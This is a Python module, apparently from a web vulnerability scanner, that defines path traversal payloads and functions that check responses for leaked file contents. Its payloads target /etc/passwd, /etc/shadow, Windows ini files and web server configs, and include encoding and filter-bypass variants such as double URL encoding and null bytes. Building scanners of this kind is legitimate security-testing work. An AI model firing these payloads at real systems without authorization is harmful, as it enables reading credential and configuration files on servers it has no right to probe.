"""
scanner/payloads/traversal.py

Path Traversal / Local File Inclusion payloads.
Tests for ability to read arbitrary files from the server.
"""

from .base import Payload


def traversal_confirm(response_text: str) -> bool:
    """
    Check for file content indicators in response.
    """
    # Success indicators - actual file content
    success_indicators = [
        # Linux files
        "root:x:",                    # /etc/passwd
        "root:*:",                    # BSD passwd
        "/bin/bash",                  # Shell reference
        "/bin/sh",                    # Shell reference
        "daemon:",                    # passwd entry
        "nobody:",                    # passwd entry
        "www-data:",                  # passwd entry
        
        # Windows files
        "[boot loader]",              # boot.ini
        "[operating systems]",        # boot.ini
        "[extensions]",               # win.ini / system.ini
        "[fonts]",                    # win.ini
        "[mci extensions]",           # win.ini
        "for 16-bit app support",     # Windows config
        
        # Generic config files
        "<?xml",                      # XML config
        "<?php",                      # PHP source
        "#!/",                        # Script shebang
        "#!/usr/bin/",               # Script shebang
        "#!",                         # Script shebang
        "DOCUMENT_ROOT",              # Apache config
        "ServerRoot",                 # Apache config
        
        # Source code disclosure
        "<?php",
        "<%@",                        # ASP
        "<%=",                        # ASP
        "import ",                    # Python
        "require ",                   # Ruby/Node
        "include(",                   # PHP
        "require_once",               # PHP
    ]
    
    text_lower = response_text.lower()
    has_success = any(indicator.lower() in text_lower for indicator in success_indicators)
    
    return has_success


def traversal_error_confirm(response_text: str) -> bool:
    """
    Check for path traversal error messages.
    Errors might indicate vulnerability even without success.
    """
    error_indicators = [
        "no such file or directory",
        "failed to open stream",
        "permission denied",
        "access denied",
        "could not find",
        "cannot find",
        "file not found",
        "does not exist",
        "is not a valid path",
        "invalid path",
        "path too long",
        "file_get_contents",
        "fopen(",
        "include(",
        "require(",
    ]
    
    text_lower = response_text.lower()
    return any(e.lower() in text_lower for e in error_indicators)


def combined_traversal_confirm(response_text: str) -> bool:
    """Combined confirmation for traversal."""
    return traversal_confirm(response_text) or traversal_error_confirm(response_text)


TRAVERSAL_PAYLOADS = [
    # ============================================
    # BASIC UNIX PATH TRAVERSAL
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd (4 levels)",
        payload="../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd (6 levels)",
        payload="../../../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd (8 levels)",
        payload="../../../../../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd absolute",
        payload="/etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux shadow",
        payload="../../../../etc/shadow",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux hosts",
        payload="../../../../etc/hosts",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    
    # ============================================
    # WINDOWS PATH TRAVERSAL
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Windows win.ini (backslash)",
        payload="..\\..\\..\\..\\windows\\win.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows win.ini (forward)",
        payload="../../../../windows/win.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows boot.ini",
        payload="..\\..\\..\\..\\boot.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows system.ini",
        payload="../../../../windows/system.ini",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    
    # ============================================
    # ENCODED VARIANTS (Filter Bypass)
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="URL encoded dots",
        payload="..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Double URL encoded",
        payload="..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Unicode encoding",
        payload="..%c0%af..%c0%af..%c0%afetc/passwd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Null byte injection",
        payload="../../../../etc/passwd%00",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Null byte with extension",
        payload="../../../../etc/passwd%00.jpg",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    
    # ============================================
    # FILTER BYPASS VARIANTS
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Double dot bypass",
        payload="....//....//....//....//etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Mixed slashes",
        payload="..\\../..\\../..\\../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Dot filter bypass",
        payload="..././..././..././etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    
    # ============================================
    # WEB SERVER CONFIG FILES
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Apache config",
        payload="../../../../etc/apache2/apache2.conf",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Nginx config",
        payload="../../../../etc/nginx/nginx.conf",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP config",
        payload="../../../../etc/php.ini",
        contexts=["url", "form"],
        severity="Medium",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
]